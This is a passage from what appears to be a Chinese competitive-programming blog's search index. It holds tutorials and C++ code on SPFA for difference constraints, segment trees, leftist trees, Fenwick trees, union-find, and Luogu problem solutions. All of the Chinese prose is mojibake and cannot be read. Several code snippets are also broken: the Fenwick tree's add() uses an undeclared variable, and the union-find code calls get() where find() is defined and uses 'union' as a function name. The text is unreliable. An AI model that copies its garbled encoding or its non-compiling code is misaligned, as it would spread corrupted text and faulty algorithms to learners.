ä»$b$åˆ°$a$å»º$c$å•å‘è¾¹ $a=b$, ä»$a$åˆ°$b$å»ºæƒå€¼ä¸º$0$çš„åŒå‘è¾¹ å¦‚æœå­˜åœ¨ä¸€ç»„è§£${x_1, x_2, \\ldots, x_n}$,åˆ™å¯¹ä»»æ„å¸¸æ•°$\\Delta$, ${x_1+\\Delta, x_2+\\Delta, \\ldots, x_n+\\Delta}$ä¹Ÿæ˜¯ä¸€ç»„è§£ä¸å¦¨å…ˆæ±‚ä¸€ç»„è´Ÿæ•°è§£,äºæ˜¯å°±æœ‰äº†æ¡ä»¶$x_i-x_0\\le 0$å³,ä»$0$å‘æ‰€æœ‰èŠ‚ç‚¹å»ºä¸€æ¡è¾¹æƒä¸º$0$çš„å•å‘è¾¹ æ±‚è§£æ—¶,è®¾$\\mathtt{dis[0]=0}$,ç„¶åä»¥$0$ä¸ºæºç‚¹æ±‚å•æºæœ€çŸ­è·¯å¦‚æœå­˜åœ¨è´Ÿç¯,åˆ™ç³»ç»Ÿæ— è§£ä¸å­˜åœ¨è´Ÿç¯,åˆ™$\\mathtt{dis[i]}$ä¸ºç³»ç»Ÿçš„ä¸€ç»„è§£ $II.$ è´Ÿç¯å¦‚æœä»»æ„ä¸€æ¡è¾¹è¢«ä¿®æ”¹å¤§äº$n$æ¬¡(æ‰§è¡Œ$n$æ¬¡æ¾å¼›æ“ä½œ),è¿™ä¸ªå›¾å†…ä¸€å®šå­˜åœ¨è‡³å°‘ä¸€ä¸ªè´Ÿç¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ•°ç»„$cnt$æ¥è®°å½•æ¯æ¡è¾¹æ‰§è¡Œæ¾å¼›æ“ä½œçš„æ¬¡æ•°å½“å‘é˜Ÿåˆ—ä¸­æ·»åŠ èŠ‚ç‚¹$\\mathtt{e.to}$æ—¶,$\\mathtt{cnt[e.to]++}$ç„¶åå†åˆ¤æ–­$\\mathtt{cnt[e.to]&gt;n}$,å¦‚æœè¿”å›$\\mathtt{true}$åˆ™å­˜åœ¨è´Ÿç¯ $III.$ $SPFA$çš„$SLF$ä¼˜åŒ–æœ¬é¢˜å¦‚æœç›´æ¥è·‘$SPFA$çš„è¯,ä¼š$TLE\\ 3$ä¸ªç‚¹,å³ä½¿æ‰‹åŠ¨å¼€äº†$O3$ä¼˜åŒ–,è¿˜æ˜¯ä¼š$TLE\\ 1$ä¸ªç‚¹æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨$SLF(Small\\ Label\\ First)$ä¼˜åŒ– $SLF:$å½“åŠ å…¥ä¸€ä¸ªæ–°èŠ‚ç‚¹$v$çš„æ—¶å€™ å¦‚æœæ­¤æ—¶çš„$\\mathtt{dis[v]}$æ¯”é˜Ÿé¦–$\\mathtt{dis[q.front()]}$å°çš„è¯ï¼Œå°±æŠŠ$v$ç‚¹åŠ å…¥åˆ°é˜Ÿé¦– å¦åˆ™æŠŠä»–åŠ å…¥åˆ°é˜Ÿå°¾ å› ä¸ºå…ˆæ‰©å±•æœ€å°çš„ç‚¹å¯ä»¥å°½é‡ä½¿ç¨‹åºå°½æ—©çš„ç»“æŸ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 10010;const int inf = 0x3f3f3f3f;struct Edge { int from, to, val; Edge(int u, int v, int w): from(u), to(v), val(w) {}};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int u, int v, int w) { edges.push_back(Edge(u, v, w)); int mm = edges.size(); G[u].push_back(mm - 1);}int n, m;int dis[maxn], vis[maxn], cnt[maxn];bool SPFA(int s) { deque&lt;int&gt; q; q.push_back(s); dis[s] = 0; vis[s] = true; while (!q.empty()) { int u = q.front(); q.pop_front(); vis[u] = false; for (int i = 0; i &lt; G[u].size(); ++i) { Edge&amp; e = edges[G[u][i]]; if (dis[e.to] &gt; dis[u] + e.val) { dis[e.to] = dis[u] + e.val; if (!vis[e.to]) { vis[e.to] = true; if (!q.empty() &amp;&amp; dis[e.to] &lt; dis[q.front()]) { q.push_front(e.to); } else { q.push_back(e.to); } cnt[e.to]++; } if (cnt[e.to] &gt; n) { return false; } } } } return true;}int main() { n = read(); m = read(); for (int i = 1; i &lt;= m; ++i) { int opt = read(); if (opt == 1) { int a = read(), b = read(), c = read(); add(a, b, -c); } else if (opt == 2) { int a = read(), b = read(), c = read(); add(b, a, c); } else { int a = read(), b = read(); add(a, b, 0); add(b, a, 0); } } for (int i = 1; i &lt;= n; ++i) { add(0, i, 0); dis[i] = inf; } printf(SPFA(0) ? &quot;Yes\\n&quot; : &quot;No\\n&quot;); return 0;}/* 1.94s 1.61MB */","link":"/p/6dcf876e.html"},{"title":"ã€Œæ•°æ®ç»“æ„ã€çº¿æ®µæ ‘","text":"çº¿æ®µæ ‘($Segment\\ Tree$)æ˜¯ä¸€ç§åŸºäºåˆ†æ²»æ€æƒ³çš„__äºŒå‰æ ‘__å½¢æ•°æ®ç»“æ„ï¼Œå¯ä»¥ç”¨äº__åŒºé—´__ä¸Šçš„æ•°æ®ç»´æŠ¤ï¼Œå®ƒå¯ä»¥ç»´æŠ¤ä»¥ä¸‹å€¼ $maxn\\ minn$ï¼ŒåŒºé—´ä¸Šæœ€å¤§æœ€å°å€¼ $sum$ï¼ŒåŒºé—´å’Œ $lmax$ï¼Œæ¯æ®µä¸Šæœ€å¤§å‰ç¼€å’Œ $rmax$ï¼Œæ¯æ®µä¸Šæœ€å¤§åç¼€å’Œ $â€¦â€¦$ å’Œä»¥ä¸‹æ“ä½œ $Add\\ x\\ y\\ k$ï¼ŒæŠŠåŒºé—´$[x,y]$å†…å…ƒç´ å€¼å…¨åŠ $k$ $Query\\ x\\ y$ï¼ŒæŸ¥è¯¢åŒºé—´$[x,y]$å†…çš„æŸä¸ªå€¼ ç”±äºçº¿æ®µæ ‘ä¼šç»´æŠ¤ä¸€ç§æ•°æ®ï¼Œå…¶ä»–ä¹Ÿå¾ˆå¥½å†™ï¼Œæ‰€ä»¥æœ¬ç¯‡ä»¥__åŒºé—´å’Œ__ä¸ºä¾‹ åŒºé—´å’Œåœ¨æ¯æ¬¡$Add$æ“ä½œä¸­ï¼Œå¦‚æœå°†ç›¸å…³åŒºé—´çš„å€¼å…¨éƒ¨æ›´æ–°ï¼Œåˆ™ä¼šæŠŠæ—¶é—´å¤æ‚åº¦æé«˜åˆ°$O(n)$ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡å–ä¸€ç§__å»¶è¿Ÿæ ‡è®°__($lazy-tag$)çš„æŠ€å·§ï¼Œå¦‚æœè¢«æ ‡è®°ï¼Œåˆ™è¯´æ˜æœ¬åŒºé—´å†…çš„å€¼è¢«æ•´ä½“åŠ ä¸ŠæŸä¸ªå€¼äº† è¯¦ç»†æ–¹æ³•è§ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253struct SegmentTree { struct SegmentTreeNode { //æ ‘ä¸Šçš„èŠ‚ç‚¹ int l, r; //èŠ‚ç‚¹è¡¨ç¤ºåŒºé—´çš„å·¦å³ç«¯ç‚¹ long long sum, add; //åŒºé—´å’Œå’Œaddçš„å»¶è¿Ÿæ ‡è®° #define l(x) tree[x].l //æ–¹ä¾¿è®¿é—® #define r(x) tree[x].r #define sum(x) tree[x].sum #define add(x) tree[x].add } tree[maxn &lt;&lt; 2]; int a[maxn], n, m; void build(int p, int l, int r) { //å»ºæ ‘ l(p) = l, r(p) = r; //è®¾ç½®å·¦å³ç«¯ç‚¹ if (l == r) { sum(p) = a[l]; return; } //åˆ°è¾¾å¶å­èŠ‚ç‚¹ int mid = (l + r) &gt;&gt; 1; build(p * 2, l, mid); //é€’å½’æ„å»ºå·¦å³æ ‘ build(p * 2 + 1, mid + 1, r); sum(p) = sum(p * 2) + sum(p * 2 + 1); //æ›´æ–°æ•°æ®ï¼Œå¯æ”¹ä¸ºéœ€è¦ç»´æŠ¤çš„å¤šä¸ªå€¼çš„ç»´æŠ¤æ–¹æ³• } void pushdown(int p) { //ä¸‹ä¼ å»¶è¿Ÿæ ‡è®° if (add(p)) { //å¦‚æœæœ‰æ ‡è®° sum(p * 2) += add(p) * (r(p * 2) - l(p * 2) + 1); //sumä¼ è‡³å·¦å„¿å­ sum(p * 2 + 1) += add(p) * (r(p * 2 + 1) - l(p * 2 + 1) + 1); //å³å„¿å­ add(p * 2) += add(p); //å»¶è¿Ÿæ ‡è®°ä¼ è‡³å·¦å„¿å­ add(p * 2 + 1) += add(p); //å³å„¿å­ add(p) = 0; //æœ¬èŠ‚ç‚¹å»¶è¿Ÿæ ‡è®°æ¸…é›¶ } } void update(int p, int l, int r, int d) { //æ›´æ–°åŒºé—´å†…å€¼ if (l &lt;= l(p) &amp;&amp; r &gt;= r(p)) { //å®Œå…¨è¦†ç›– sum(p) += (long long)d * (r(p) - l(p) + 1); //æ›´æ–°èŠ‚ç‚¹ä¿¡æ¯ add(p) += d; //æ‰“ä¸Šå»¶è¿Ÿæ ‡è®° return; } pushdown(p); //ä¸‹ä¼ æ ‡è®° int mid = (l(p) + r(p)) &gt;&gt; 1; if (l &lt;= mid) update(p * 2, l, r, d); //é€’å½’æ›´æ–°å·¦å³ if (r &gt; mid) update(p * 2 + 1, l, r, d); sum(p) = sum(p * 2) + sum(p * 2 + 1); //ç»´æŠ¤æ•°æ® } long long query(int p, int l, int r) { //æŸ¥è¯¢æ“ä½œ if (l &lt;= l(p) &amp;&amp; r &gt;= r(p)) return sum(p); //å®Œå…¨è¦†ç›– pushdown(p); //ä¸‹ä¼ æ ‡è®° int mid = (l(p) + r(p)) &gt;&gt; 1; long long ans = 0; if (l &lt;= mid) ans += query(p * 2, l, r); //åŠ ä¸Šå·¦å³éƒ¨åˆ†å€¼ if (r &gt; mid) ans += query(p * 2 + 1, l, r); return ans; } #undef add //é˜²æ­¢åç»­ä½¿ç”¨addç­‰å‡ºç°é”™è¯¯ #undef sum #undef l #undef r}; ä¸ºäº†ä½¿ä»£ç ç®€æ´ï¼Œè¿˜å¯ä»¥å®å®šä¹‰ä¸€äº›åç§° 1234#define lt p&lt;&lt;1 //å·¦å­©å­#define rt p&lt;&lt;1|1 //å³å­©å­#define lson lt,l,mid //å·¦å­æ ‘#define rson rt,mid+1,r //å³å­æ ‘ $Luogu$æ¨¡æ¿é¢˜ç›®Luogu P3372 çº¿æ®µæ ‘1 (åŒºé—´å¢åŠ ï¼ŒåŒºé—´æŸ¥è¯¢å’Œ) Luogu P3373 çº¿æ®µæ ‘2 (åŒºé—´å¢åŠ ï¼ŒåŒºé—´ä¹˜æ•°ï¼ŒåŒºé—´æŸ¥è¯¢å’Œ) $SPOJ$çš„$GSS$ç³»åˆ— SP1043 GSS1 - Can you answer these queries I SP1557 GSS2 - Can you answer these queries II SP1716 GSS3 - Can you answer these queries III SP2713 GSS4 - Can you answer these queries IV SP2916 GSS5 - Can you answer these queries V SP4487 GSS6 - Can you answer these queries VI SP6779 GSS7 - Can you answer these queries VII","link":"/p/d1cf0d36.html"},{"title":"ã€Œæ•°æ®ç»“æ„ã€å·¦åæ ‘(å¯å¹¶å †)","text":"å·¦åæ ‘($Leftist\\ Tree$)ï¼Œæ˜¯ä¸€ç§ __å¯ä»¥åˆå¹¶çš„å †çŠ¶ç»“æ„__ï¼Œæ”¯æŒä»¥ä¸‹æ“ä½œ $Pop\\ x$ï¼Œåˆ é™¤èŠ‚ç‚¹$x$ $Merge\\ x\\ y$ï¼Œåˆå¹¶ä¸¤æ£µå·¦åæ ‘ å¯¹äºä¸€ä¸ªå·¦åæ ‘çš„èŠ‚ç‚¹ï¼Œéœ€è¦ç»´æŠ¤ä»¥ä¸‹å€¼ $dist$ï¼Œè®°å½•è¿™ä¸ªèŠ‚ç‚¹åˆ°å®ƒå­æ ‘é‡Œé¢æœ€è¿‘çš„å¶å­èŠ‚ç‚¹çš„è·ç¦» $value$ï¼Œæ¯ä¸ªèŠ‚ç‚¹åŒ…å«çš„å€¼ æ€§è´¨ ä¸€ä¸ªèŠ‚ç‚¹çš„$value$å¤§äº(æˆ–å°äº)å·¦å³å­©å­çš„$value$(å †æ€§è´¨) ä¸€ä¸ªèŠ‚ç‚¹çš„å·¦å­©å­çš„$dist$ä¸å°äºå³å­©å­çš„$dist$(å·¦åæ€§è´¨) ä¸€ä¸ªèŠ‚ç‚¹çš„è·ç¦»å§‹ç»ˆç­‰äºå³å­©å­+1 å®ç°$Merge$æ“ä½œé¦–å…ˆæˆ‘ä»¬è®¾ä¸¤ä¸ªèŠ‚ç‚¹$x,y$ï¼Œ$x$çš„æ ¹èŠ‚ç‚¹çš„æƒå€¼å°äºç­‰äº$y$çš„æ ¹èŠ‚ç‚¹ï¼ˆå¦åˆ™$swap(x,y)$ï¼‰ï¼ŒæŠŠ$x$çš„æ ¹èŠ‚ç‚¹ä½œä¸ºæ–°æ ‘$Z$çš„æ ¹èŠ‚ç‚¹ï¼Œå‰©ä¸‹çš„äº‹å°±æ˜¯åˆå¹¶$x$çš„å³å­æ ‘å’Œ$y$äº† åˆå¹¶äº†$x$çš„å³å­æ ‘å’Œ$y$åï¼Œ$x$å½“$x$çš„å³å­æ ‘çš„è·ç¦»å¤§äº$x$çš„å·¦å­æ ‘çš„è·ç¦»æ—¶ï¼Œä¸ºäº†ç»´æŠ¤å·¦åæ€§è´¨ï¼Œæˆ‘ä»¬è¦äº¤æ¢$x$çš„å³å­æ ‘å’Œå·¦å­æ ‘ã€‚é¡ºä¾¿ç»´æŠ¤æ€§è´¨ä¸‰ï¼Œæ‰€ä»¥ç›´æ¥$dist_x=dist_{rson(x)}+1$ $Pop$æ“ä½œç•¥$â€¦$ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849struct LeftistTree { int n, m; struct LeftistTreeNode { int dis, val, rt; int ls, rs; #define ls(x) tree[x].ls #define rs(x) tree[x].rs #define dis(x) tree[x].dis #define val(x) tree[x].val #define rt(x) tree[x].rt }tree[maxn]; int merge(int x, int y) { if (!x || !y) return x + y; if (val(x) &gt; val(y) || (val(x) == val(y) &amp;&amp; x &gt; y)) { swap(x, y); } rs(x) = merge(rs(x), y); if (dis(ls(x)) &lt; dis(rs(x))) swap(ls(x), rs(x)); rt(ls(x)) = rt(rs(x)) = rt(x) = x; dis(x) = dis(rs(x)) + 1; return x; } int get(int x) { //è·¯å¾„å‹ç¼© return rt(x) == x ? x : rt(x) = get(rt(x)); } void pop(int x) { val(x) = -1; rt(ls(x)) = ls(x); rt(rs(x)) = rs(x); rt(x) = merge(ls(x), rs(x)); } void init() { dis(0) = -1; for (int i = 1; i &lt;= n; ++i) { rt(i) = i; val(i) = read(); } } void SolveMerge(int x, int y) { if (val(x) == -1 || val(y) == -1) return; int fx = get(x), fy = get(y); if (fx != fy) { rt(fx) = rt(fy) = merge(fx, fy); } } void SolvePop(int x) { if (val(x) == -1) puts(&quot;-1&quot;); else printf(&quot;%d\\n&quot;, val(get(x))), pop(get(x)); }}; $Luogu$æ¨¡æ¿é¢˜ç›®Luogu P3377 å·¦åæ ‘(å¯å¹¶å †)","link":"/p/7ab0d731.html"},{"title":"ã€Œæ•°æ®ç»“æ„ã€æ ‘çŠ¶æ•°ç»„","text":"æ ‘çŠ¶æ•°ç»„($Binary\\ Indexed\\ Trees$)æ˜¯ä¸€ä¸ªç»´æŠ¤__å‰ç¼€å’Œ__çš„æ•°æ®ç»“æ„ï¼Œéœ€è¦æ”¯æŒä»¥ä¸‹æ“ä½œ $Add\\ x\\ y$ï¼Œå•ç‚¹å¢åŠ ï¼Œa[x] += y $Query\\ x$ï¼ŒæŸ¥è¯¢å‰ç¼€å’Œ å‰ç½®çŸ¥è¯†$lowbit$è¿ç®—$lowbit(n)$è¡¨ç¤ºéè´Ÿæ•´æ•°$n$åœ¨äºŒè¿›åˆ¶è¡¨ç¤ºä¸‹__æœ€ä½ä½çš„1åŠå…¶åè¾¹æ‰€æœ‰çš„0æ„æˆçš„æ•°å€¼__ ä¸ºäº†å®ç°$lowbit$è¿ç®—ï¼Œå…ˆæŠŠ$n$å–åï¼Œæ­¤æ—¶ç¬¬$k$ä½å˜ä¸º$0$(è®¾ç¬¬$k$ä½æ˜¯$1$ï¼Œå…¶åå‡ä¸º$0$)ï¼Œç¬¬$0\\sim k-1$ä½å˜ä¸º$1$ï¼Œå†æ•´ä½“åŠ ä¸€ï¼Œæ‰€ä»¥ç¬¬$k$ä½å˜ä¸º$1$ï¼Œå…¶åä¸º$0$ï¼Œå…¶å‰æ¯ä½æ°å¥½ä¸åŸæ•°ç›¸åï¼Œå†æŒ‰ä½æ±‚ä¸($&amp;$)å³å¯å¾—åˆ°ã€‚ç”±äºåœ¨è¡¥ç ä¸‹ï¼Œ$\\sim n=-1-n$ï¼Œæ‰€ä»¥ $$lowbit(n)=n\\ &amp;\\ (\\sim n+1)=n\\ &amp;\\ -n$$ 1int lowbit(int n) { return n &amp; -n; } ç®—æ³•å®ç°å¯¹äºä¸€ä¸ªåŸåºåˆ—$a[]$ï¼Œå¯ä»¥å»ºç«‹ä¸€ä¸ªæ•°ç»„$tree[]$ï¼Œæ¥ä¿å­˜$a$çš„åŒºé—´$[x-lowbit(x)+1, x]$å†…å€¼çš„å’Œï¼Œå³ $$tree[x] = \\sum_{i=x-lowbit(x)+1}^x{a[i]}$$ åŒæ—¶$tree$æ•°ç»„å¯ä»¥çœ‹æˆä¸€ä¸ªæ ‘å½¢ç»“æ„ï¼Œå¹¶æ»¡è¶³ä»¥ä¸‹æ€§è´¨ æ¯ä¸ªèŠ‚ç‚¹$tree[x]$ä¿å­˜ä»¥$x$ä¸ºæ ¹çš„å­æ ‘ä¸­æ‰€æœ‰å¶èŠ‚ç‚¹çš„å’Œ æ¯ä¸ªèŠ‚ç‚¹$tree[x]$çš„å­èŠ‚ç‚¹ä¸ªæ•°ç­‰äº$lowbit(x)$çš„ä½æ•° é™¤æ ‘æ ¹å¤–ï¼Œæ¯ä¸ªèŠ‚ç‚¹$tree[x]$çš„çˆ¶äº²èŠ‚ç‚¹ä¸º$tree[x+lowbit(x)]$ æ ‘çš„æ·±åº¦ä¸º$\\log_2n$ æ ¹æ®è¿™äº›æ€§è´¨ï¼Œå°±å¾ˆå®¹æ˜“åœ°å†™å‡ºä»£ç  1234567891011121314151617struct BIT { int tree[maxn], n, m; int lowbit(int k) { return k &amp; -k; } void add(int x, int k) { for (; x &lt;= maxn; x += x &amp; -x) tree[x] += y; } int query(int x) { int ans = 0; for (; x; x -= x &amp; -x) ans += tree[x]; return ans; } int init() { for (int i = 1; i &lt;= n; ++i) { add(i, a[i]); } }}; å®é™…ä¸Šï¼Œæ ‘çŠ¶æ•°ç»„å¯ä»¥åµŒå¥—ç»´æŠ¤ï¼Œæ¥è§£å†³æ›´å¤šé—®é¢˜ï¼Œä¾‹å¦‚åŒºé—´ä¿®æ”¹ $Luogu$æ¨¡æ¿é¢˜ç›®Luogu P3374 æ ‘çŠ¶æ•°ç»„1 (å•ç‚¹ä¿®æ”¹ï¼ŒåŒºé—´æŸ¥è¯¢) Luogu P3368 æ ‘çŠ¶æ•°ç»„2 (åŒºé—´ä¿®æ”¹ï¼Œå•ç‚¹æŸ¥è¯¢) Luogu P3372 çº¿æ®µæ ‘1 (åŒºé—´ä¿®æ”¹ï¼ŒåŒºé—´æŸ¥è¯¢)","link":"/p/8c13697e.html"},{"title":"ã€Œæ•°æ®ç»“æ„ã€å¹¶æŸ¥é›†","text":"å¹¶æŸ¥é›†($union-find\\ \\ set$)æ˜¯ä¸€ç§å¯ä»¥__åŠ¨æ€ç»´æŠ¤__è‹¥å¹²ä¸ªä¸é‡å çš„__é›†åˆ__ï¼Œå¹¶æ”¯æŒ__åˆå¹¶ä¸æŸ¥è¯¢__çš„æ•°æ®ç»“æ„ï¼Œæ”¯æŒä»¥ä¸‹ä¸¤ç§åŸºæœ¬æ“ä½œï¼š $Find$ï¼ŒæŸ¥è¯¢ä¸€ä¸ªå…ƒç´ å±äºå“ªä¸ªé›†åˆ(å³æŸ¥æ‰¾æ ¹) $Union$ï¼ŒæŠŠä¸¤ä¸ªé›†åˆåˆå¹¶æˆä¸€ä¸ªé›†åˆ åŸºæœ¬å®ç°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ ‘å½¢ç»“æ„å­˜å‚¨é›†åˆï¼Œæ ‘ä¸Šæ¯ä¸ªç‚¹è¡¨ç¤ºä¸€ä¸ªå…ƒç´ ï¼Œæ ‘æ ¹å¯ä»¥ä»£è¡¨è¿™ä¸ªé›†åˆ ä½¿ç”¨ä¸€ä¸ªæ•°ç»„ufs[]æ¥ä¿å­˜æ¯ä¸ªèŠ‚ç‚¹çš„çˆ¶äº²èŠ‚ç‚¹ åˆ™åˆå¹¶$x,y$æ‰€åœ¨çš„é›†åˆå¯ä»¥è¡¨ç¤ºä¸º$ufs[root_x]=root_y$ æŸ¥æ‰¾æ ¹èŠ‚ç‚¹å¯ä»¥ä¸€ç›´æ²¿ç€æ•°ç»„å‘ä¸ŠæŸ¥æ‰¾ è·¯å¾„å‹ç¼©é˜²æ­¢æ•´æ£µæ ‘çš„é“¾éå¸¸é•¿ï¼Œå¯¼è‡´æ¯æ¬¡æŸ¥è¯¢æ—¶é—´å¤æ‚åº¦æé«˜ï¼Œå¯ä»¥åœ¨__æ¯æ¬¡æ‰§è¡Œ$Find$æ“ä½œæ—¶ï¼ŒæŠŠè®¿é—®çš„èŠ‚ç‚¹æŒ‡å‘æ ¹èŠ‚ç‚¹__ï¼Œè¿™ç§æ–¹æ³•ç§°ä¸º__è·¯å¾„å‹ç¼©__ï¼Œ$Find$æ“ä½œçš„æ—¶é—´å¤æ‚åº¦ä¸º$O(log_2n)$ $Code\\ Below:$ 1234567891011121314int ufs[maxn];//åˆå§‹åŒ–ï¼Œæ¯ä¸ªç‚¹ç‹¬ç«‹(è‡ªå·±æ˜¯è‡ªå·±çš„æ ¹)for (int i = 1; i &lt;= n; ++i) ufs[i] = i;//Findæ“ä½œint find(int x) { return x == ufs[x] ? x : ufs[x] = find(ufs[x]);}//unionæ“ä½œ(æ³¨æ„unionæ˜¯C++å…³é”®å­—)void unionn(int x, int y) { ufs[get(x)] = get(y)} å¸¦æƒå¹¶æŸ¥é›†æœ‰æ—¶ï¼Œéœ€è¦ç»´æŠ¤çš„æ¯ä¸ªèŠ‚ç‚¹åˆ°æ ¹èŠ‚ç‚¹çš„è¾¹æƒå€¼ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸ªæ•°ç»„d[]æ¥ä¿å­˜æƒå€¼ï¼Œå¯¹äºä¸¤ä¸ªæ“ä½œä¹Ÿæœ‰æ‰€æ›´æ”¹ å†å¢åŠ ä¸€ä¸ªæ•°ç»„size[]è®°å½•æ¯ä¸ªæ ‘æ ¹ä¸Šé›†åˆå¤§å° 1234567891011121314//Findint find(int x) { if (ufs[x] == x) return x; int fx = find(ufs[x]); d[x] += d[ufs[x]]; return ufs[x] = fx;}//unionvoid union(int x, int y) { int fx = find(x), fy = find(y); ufs[fx] = fy; d[fx] = size[fy]; size[fy] += size[fx];} å¯æ’¤é”€å¹¶æŸ¥é›†å¯èƒ½éœ€è¦ç»´æŠ¤ä¸€ä¸ªå¹¶æŸ¥é›†å¹¶è¦æ±‚å¯ä»¥__æ’¤é”€__ä¸¤èŠ‚ç‚¹çš„è¿æ¥å…³ç³» æˆ‘ä»¬å¯ä»¥å¯¹æ¯ä¸ªæ“ä½œ$(u, v)$æ‰§è¡Œå‰ï¼ŒæŠŠèŠ‚ç‚¹$u$æ¢ä¸ºæ ‘æ ¹(ä¸éš¾å‘ç°ï¼Œ$ufs[]$å˜åŒ–çš„åªæœ‰ä»$u$åˆ°åŸèŠ‚ç‚¹çš„ä¸€æ¡é“¾ä¸Š) ç„¶åå¯¹äºæ“ä½œ $Connect\\ u\\ v$ï¼Œéœ€è¦æŠŠ$u$çš„çˆ¶äº²èŠ‚ç‚¹è®¾ä¸º$v$ $Delete\\ u\\ v$ï¼Œå¯ä»¥æŠŠ$v$çš„çˆ¶äº²èŠ‚ç‚¹è®¾ä¸º$0$ $Query\\ u\\ v$ï¼Œç›´æ¥æš´åŠ›æœç´¢$v$æ‰€åœ¨çš„é“¾å³å¯ 1234567891011121314151617181920212223struct UnionFindSet { int ufs[maxn]; void init() { for (int i = 0; i &lt;= n; ++i) { ufs[i] = i; } } inline void sroot(int u) { //æ¢uä¸ºæ ¹ for (int i = 0, fa = ufs[u]; u; fa = ufs[u]) { ufs[u] = i; i = u; u = fa; } } void connect(int u, int v) { ufs[u] = v; } void deleteuv(int u, int v) { ufs[v] = 0; } void query(int u, int v) { for (; v != u &amp;&amp; v; v = ufs[v]); puts(v == u ? &quot;Yes&quot; : &quot;No&quot;); }}; $Luogu$æ¨¡æ¿é¢˜ç›®Luogu P3367 å¹¶æŸ¥é›† (æ™®é€šå¹¶æŸ¥é›†) Luogu P1196 é“¶æ²³è‹±é›„ä¼ è¯´ (å¸¦æƒå¹¶æŸ¥é›†) Luogu P2147 æ´ç©´å‹˜æ¢ (å¯æ’¤é”€å¹¶æŸ¥é›†)","link":"/p/9c4b8ceb.html"},{"title":"ã€ŒLuogu P2723 P1631 P2850ã€å°ç»ƒä¹ -é¢˜è§£","text":"æˆ˜ç¥ç•™çš„è¿˜æœ‰ä¸€é“ã€ŒP3378ã€å †,ä½†æ˜¯æ˜¯æ¨¡æ¿,å°±ä¸ç”¨å¤šè¯´äº†å§ $\\mathcal{ã€ŒP2723ã€}$ ä¸‘æ•°$92$åˆ†$STL$åšæ³•æ€è·¯å¾ˆç®€å•,æ¯æ¬¡å¼¹å‡ºå †é¡¶,ä¾æ¬¡ä¹˜$S$é›†åˆå†…çš„æ•°,å†å‹å…¥ä¼˜å…ˆé˜Ÿåˆ—($priority\\_queue$)å’Œé›†åˆ($set$,ç›®çš„æ˜¯å»é‡)ä¸­,è¾“å‡ºæœ€åä¸€ä¸ªå †é¡¶å³å¯ç„¶è€Œç¬¬$4$ä¸ªç‚¹å¡äº†åå¤šç§’,$92$åˆ† 1234567891011121314151617181920212223242526272829#include &lt;bits/stdc++.h&gt;using namespace std;const int maxk = 110;long long k, n, a[maxk], i, t;priority_queue&lt;long long, vector&lt;long long&gt;, greater&lt;long long&gt; &gt; q;set&lt;long long&gt; s;int main() { scanf(&quot;%lld %lld&quot;, &amp;k, &amp;n); for (long long i = 1; i &lt;= k; ++i) { scanf(&quot;%lld&quot;, &amp;a[i]); } q.push(1); s.insert(1); while (i++ &lt;= n) { t = q.top(); q.pop(); for (long long j = 1; j &lt;= k; ++j) { long long num = t * a[j]; if (!s.count(num)) { s.insert(num); q.push(num); } } } printf(&quot;%lld\\n&quot;, t); return 0;}/* 92points TLE with O2 */ $100$åˆ†å¾ªç¯åšæ³•æ€è·¯ç”±é¢˜å¯çŸ¥,å½“å‰äº§ç”Ÿçš„ç¬¬$i$ä¸ªä¸‘æ•°$s[i]$,æ˜¯ä¹‹å‰çš„æŸä¸ªä¸‘æ•°$\\times a[j]$æŸä¸ªä¸‘æ•°$\\times a[j]$éœ€è¦å¤§äº$s[i-1]$,è€Œä¸”è¦å°½å¯èƒ½çš„å°äºæ˜¯æˆ‘ä»¬å¯ä»¥æšä¸¾$j$,ç„¶åæ‰¾åˆ°æœ€å°çš„ä¸€ä¸ªä¸‘æ•°$minn$ä½¿$minn\\times a[j]&gt;s[i-1]$ ä½†æ˜¯..ä¸‰é‡å¾ªç¯å¯èƒ½è¿˜ä¼š$TLE$ å¾ˆå®¹æ˜“å‘ç°æ»¡è¶³æ¡ä»¶çš„ä¸‘æ•°$x\\times a[j]&gt;s[i-1]$,ä¸€å®šæ»¡è¶³æ¡ä»¶$x\\times a[j]&gt;s[i-2]$äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥ä»æ»¡è¶³$x\\times a[j]&gt;s[i-2]$çš„ä¸‘æ•°$x$çš„ä½ç½®å¾€åæšä¸¾,æ‰¾åˆ°æ»¡è¶³æ¡ä»¶$x\\times a[j]&gt;s[i-1]$çš„ä¸‘æ•°ä»£ç é‡Œ$b[j]$è¡¨ç¤º$a[j]$è‡³å°‘ä¸ç¬¬å‡ å°ä¸‘æ•°ç›¸ä¹˜æ‰èƒ½å¾—åˆ°ä¸€ä¸ªæ¯”$s[i-1]$å¤§çš„ä¸‘æ•° ä»£ç 123456789101112131415161718192021222324252627282930#include &lt;bits/stdc++.h&gt;using namespace std;const int maxk = 110;const int maxn = 100010;long long k, n, a[maxk], i, t, s[maxn], b[maxk];int main() { scanf(&quot;%lld %lld&quot;, &amp;k, &amp;n); for (long long i = 1; i &lt;= k; ++i) { scanf(&quot;%lld&quot;, &amp;a[i]); } s[0] = 1; for (long long i = 1; i &lt;= n; ++i) { long long minn = (long long)1 &lt;&lt; 61; for (long long j = 1; j &lt;= k; ++j) { while (a[j] * s[b[j]] &lt;= s[i - 1]) { b[j]++; } if (a[j] * s[b[j]] &lt; minn) { minn = a[j] * s[b[j]]; } } s[i] = minn; } printf(&quot;%lld\\n&quot;, s[n]); return 0;}/* 101ms 1584kB */ $\\mathcal{ã€ŒP1631ã€}$ åºåˆ—åˆå¹¶æ€è·¯å‚è€ƒRed_w1nE æŠŠ$A$å’Œ$B$ä¸¤ä¸ªåºåˆ—åˆ†åˆ«ä»å°åˆ°å¤§æ’åºè¿™æ 